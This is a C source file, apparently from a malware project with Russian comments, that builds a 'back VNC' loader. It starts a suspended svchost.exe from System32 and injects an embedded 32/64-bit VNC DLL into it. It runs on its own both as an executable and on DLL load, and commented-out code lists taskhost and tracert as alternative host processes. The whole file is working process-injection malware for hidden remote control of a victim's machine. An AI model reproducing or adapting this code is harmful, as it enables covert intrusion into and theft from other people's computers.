#include "../common/common.h"
#include "../acdll/image.h"
#include "../acdll/activdll.h"

#include <ShlObj.h>
#include <Shlwapi.h>

#include "vncdll32.h"
#include "vncdll64.h"

HANDLE g_AppHeap = 0;

PVOID __stdcall	AppAlloc(ULONG Size)
{
	return Alloc(Size);
}

void __stdcall AppFree(PVOID pMem)
{
	Free(pMem);
}

PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return Realloc(pMem, Size);
}

static BOOL InitAdContext(PAD_CONTEXT pAdContext)
{
	pAdContext->pModule32 = (ULONGLONG)(LPVOID)vncdll32;
	pAdContext->Module32Size = sizeof(vncdll32);

#ifndef _WIN64
	if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
#endif
	{
		pAdContext->pModule64 = (ULONGLONG)(LPVOID)vncdll64;
		pAdContext->Module64Size = sizeof(vncdll64);
	}

	return TRUE;
}

static BOOL ExecuteInject(void)
{
	BOOL ok = FALSE;

	if (NO_ERROR != InitGlobals(GetModuleHandle(NULL), G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID))
		return ok;

	AD_CONTEXT AdContext = { 0 };
	if (InitAdContext(&AdContext))
	{
		if (NO_ERROR == AcStartup(&AdContext, FALSE))
		{
			PsSupDisableWow64Redirection();

			WCHAR System32Path[MAX_PATH] = { 0 }, Path[MAX_PATH * 2] = { 0 };
			if (S_OK == SHGetFolderPathW(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, System32Path))
			{
				PROCESS_INFORMATION pi = { 0 };
				STARTUPINFOW si = { 0 };
				si.cb = sizeof(STARTUPINFOW);

				WCHAR MyPath[MAX_PATH];
				DWORD copied = 0;
				GetModuleFileNameW(NULL, MyPath, MAX_PATH);

				PathCombineW(Path, System32Path, L"svchost.exe -k");
				ok = CreateProcessW(NULL, Path, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);


				//PathCombineW(Path, System32Path, L"taskhost.exe");
				//ok = CreateProcessW(NULL, Path, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
				//if (!ok)
				//{
				//	PathCombineW(Path, System32Path, L"taskhostw.exe");
				//	ok = CreateProcessW(NULL, Path, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
				//	if (!ok)
				//	{
				//		PathCombineW(Path, System32Path, L"tracert.exe");
				//		ok = CreateProcessW(NULL, Path, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
				//	}
				//}

				if (ok)
				{
					DbgPrint("CreateProcessW ok, %d", pi.dwProcessId);
					ok = (NO_ERROR == AcInjectDll(&pi, CREATE_SUSPENDED, TRUE));
					DbgPrint("AcInjectDll %s", ok ? "ok" : "FAIL");
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
				}
				else
					DbgPrint("CreateProcessW FAIL");
			}

			PsSupEnableWow64Redirection();
			AcCleanup();
		}
	}

	return ok;
}

// для работы ехе
int main(void)
{
	DbgPrint("Starting back VNC in separate process...");
	ExecuteInject();
	return 0;
}

// для работы dll
BOOL APIENTRY DllMain(HMODULE Module, DWORD ReasonForCall, LPVOID Reserved)
{
	if (DLL_PROCESS_ATTACH == ReasonForCall)
		main();
	return TRUE;
}